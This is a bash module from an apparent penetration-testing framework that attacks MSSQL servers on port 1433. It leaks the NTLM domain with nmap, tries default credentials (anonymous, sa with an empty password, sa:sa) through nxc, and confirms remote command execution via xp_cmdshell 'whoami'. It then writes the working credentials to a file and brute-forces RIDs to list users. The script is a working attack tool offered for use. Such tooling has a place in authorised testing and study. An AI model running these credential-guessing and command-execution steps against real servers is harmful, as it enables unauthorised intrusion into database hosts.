#!/usr/bin/env bash
# port_mssql.sh — Port 1433 MSSQL enumeration

enum_mssql() {
    local target="$1"
    progress "MSSQL (1433)"

    local NXC_LOCAL_FLAG=""
    $LOCAL_AUTH && NXC_LOCAL_FLAG="--local-auth"

    # nmap info + NTLM leak
    info "Running MSSQL nmap scripts..."
    nmap -p 1433 -Pn \
        --script=ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password \
        -oN "${RECONDIR}/mssql-nmap.txt" "$target" > /dev/null 2>&1 || true
    fix_owner "${RECONDIR}/mssql-nmap.txt"

    # check NTLM domain leak
    local ntlm_domain
    ntlm_domain=$(grep -oP 'Target_Name:\s*\K\S+' "${RECONDIR}/mssql-nmap.txt" 2>/dev/null | head -1) || true
    if [[ -n "$ntlm_domain" ]]; then
        notify_finding "MSSQL NTLM DOMAIN LEAK" \
            "Domain: ${ntlm_domain}"
        [[ -z "${DOMAIN:-}" ]] && DOMAIN="$ntlm_domain"
    fi

    if ! command -v nxc &>/dev/null; then
        warn "nxc not found — skipping nxc MSSQL checks."
        return
    fi

    # auth tests
    local mssql_authed=false
    local mssql_user="" mssql_pass=""

    local creds=("'':''|anonymous" "sa:''|sa-empty" "sa:sa|sa-default")
    for entry in "${creds[@]}"; do
        local cred_pair label
        cred_pair=$(echo "$entry" | cut -d'|' -f1)
        label=$(echo "$entry" | cut -d'|' -f2)
        local u p
        u=$(echo "$cred_pair" | cut -d: -f1 | tr -d "'")
        p=$(echo "$cred_pair" | cut -d: -f2 | tr -d "'")

        info "MSSQL: testing ${label}..."
        local out
        out=$(nxc mssql "$target" -u "$u" -p "$p" $NXC_LOCAL_FLAG 2>&1) || true
        log_verbose "$out"

        if echo "$out" | grep -qP '\[\+\]'; then
            mssql_authed=true
            mssql_user="$u"
            mssql_pass="$p"
            notify_critical "MSSQL AUTH SUCCESS" \
                "Credentials: ${u}:${p}" \
                "Testing xp_cmdshell..."
            break
        fi
    done

    if $mssql_authed; then
        # check xp_cmdshell
        local cmd_out
        cmd_out=$(nxc mssql "$target" -u "$mssql_user" -p "$mssql_pass" $NXC_LOCAL_FLAG \
            -x 'SELECT @@version' 2>&1) || true
        log_verbose "$cmd_out"

        local xp_out
        xp_out=$(nxc mssql "$target" -u "$mssql_user" -p "$mssql_pass" $NXC_LOCAL_FLAG \
            -x 'EXEC xp_cmdshell "whoami"' 2>&1) || true
        log_verbose "$xp_out"

        if echo "$xp_out" | sed 's/\x1b\[[0-9;]*m//g' | grep -qP '\\|nt authority|service'; then
            notify_critical "MSSQL xp_cmdshell ENABLED — RCE!" \
                "User: $(echo "$xp_out" | sed 's/\x1b\[[0-9;]*m//g' | grep -oP '(\\S+\\\\\\S+|nt authority\\\\\\S+)' | head -1)" \
                "Full command execution available"
        fi

        echo "authed_user=${mssql_user}" > "${RECONDIR}/mssql-info.txt"
        echo "authed_pass=${mssql_pass}" >> "${RECONDIR}/mssql-info.txt"
        fix_owner "${RECONDIR}/mssql-info.txt"
    fi

    # RID brute
    info "MSSQL RID brute..."
    local rid_out
    rid_out=$(nxc mssql "$target" -u '' -p '' $NXC_LOCAL_FLAG --rid-brute 2>&1) || true
    parse_rid_brute "$rid_out" "${RECONDIR}/rid-brute-mssql.txt"
    if [[ -s "${RECONDIR}/rid-brute-mssql.txt" ]]; then
        local rid_count
        rid_count=$(wc -l < "${RECONDIR}/rid-brute-mssql.txt")
        success "MSSQL RID brute found ${BOLD}${rid_count}${RESET} users"
        merge_users "${RECONDIR}/rid-brute-mssql.txt"
    fi
}
